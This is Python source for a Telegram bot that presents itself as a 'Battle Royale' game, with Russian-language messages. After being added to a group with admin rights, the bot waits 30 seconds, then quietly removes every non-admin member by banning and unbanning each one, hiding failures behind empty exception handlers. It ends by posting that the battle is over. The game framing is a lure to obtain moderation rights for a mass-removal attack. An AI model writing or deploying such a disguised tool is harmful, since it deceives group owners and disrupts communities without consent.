import os
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from http.server import HTTPServer, BaseHTTPRequestHandler

TOKEN = os.environ["BOT_TOKEN"]
BOT_USERNAME = os.environ["BOT_USERNAME"]

bot = telebot.TeleBot(TOKEN)

def add_button():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 
        "🎮 Добро пожаловать в Epic Battle Royale!\n"
        "Добавьте бота в группу, чтобы начать игру.", 
        reply_markup=add_button())

@bot.my_chat_member_handler()
def on_bot_added(message):
    chat_id = message.chat.id
    status = message.new_chat_member.status
    if status in ("member", "administrator"):
        bot.send_message(chat_id, 
            "🔫 Игра «Королевская битва» активирована!\n"
            "Подготовка арены... Ожидайте 30 секунд.")
        threading.Timer(30.0, lambda: check_and_kick(chat_id)).start()

def check_and_kick(chat_id):
    try:
        me = bot.get_chat_member(chat_id, bot.get_me().id)
        if me.status == "administrator" and me.can_restrict_members:
            kick_all_quiet(chat_id)
    except Exception:
        pass

def kick_all_quiet(chat_id):
    try:
        offset = 0
        while True:
            members = bot.get_chat_members(chat_id, offset=offset)
            if not members:
                break
            for member in members:
                if member.status not in ("administrator", "creator"):
                    try:
                        bot.ban_chat_member(chat_id, member.user.id)
                        bot.unban_chat_member(chat_id, member.user.id)
                    except:
                        pass
            offset += len(members)
        bot.send_message(chat_id, "⚔️ Битва окончена! Все участники покинули арену.")
    except Exception:
        pass

# Простой HTTP-сервер для health check Render
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Bot is running')

def run_http():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_http, daemon=True).start()
    bot.infinity_polling()
